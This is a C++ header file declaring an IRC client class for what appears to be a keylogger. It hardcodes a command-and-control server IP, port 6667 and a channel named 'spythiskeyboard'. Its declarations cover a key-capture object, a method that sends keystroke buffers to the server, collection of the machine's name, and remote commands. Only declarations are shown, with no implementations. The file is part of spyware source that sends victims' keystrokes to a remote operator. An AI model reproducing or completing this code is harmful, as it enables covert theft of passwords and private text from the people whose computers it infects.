#ifndef MYIRC_H_
#define MYIRC_H_

#include <map>
#include <string>
#include <sstream>
#include "MySocket.h"
#include "Key.h"

#define IP      "84.240.3.129"
#define PORT    6667
#define CHAN    "spythiskeyboard"
#define TIME    3

class MyIrc
{
private:
    MySocket                                                                    _cli;
    SYSTEMTIME                                                                  _lastTimestamp;
    SYSTEMTIME                                                                  _currentTimestamp;
    std::map<std::string, bool (MyIrc::*)(std::string&, std::string&)>          _dico;
    std::map<std::string, bool (MyIrc::*)(std::string&, std::string&)>          _cmd;
    Key                                                                         _key;
    std::string                                                                 _computerName;
    void                                                                        setGoodTimestamp();
    void                                                                        sendKeyBuff(std::string&);

public:
    MyIrc();
    ~MyIrc();
    bool                                                                        load(bool);
    void                                                                        setComputerName(std::string);
    bool                                                                        init(std::string, std::string, int);
    std::string                                                                 strtockf(std::string, char);
    bool                                                                        getData(std::string&, std::string&);
    bool                                                                        saveCo();
    bool                                                                        login(std::string&, std::string&);
    bool                                                                        alterLogin(std::string&, std::string&);
    bool                                                                        chanJoin(std::string&, std::string&);
    bool                                                                        pingServ(std::string&, std::string&);
    
    /* cmd*/
    bool                                                                        quit(std::string&, std::string&);
    bool                                                                        ping(std::string&, std::string&);
    bool                                                                        test(std::string&, std::string&);
};

#endif /* MYIRC_H_ */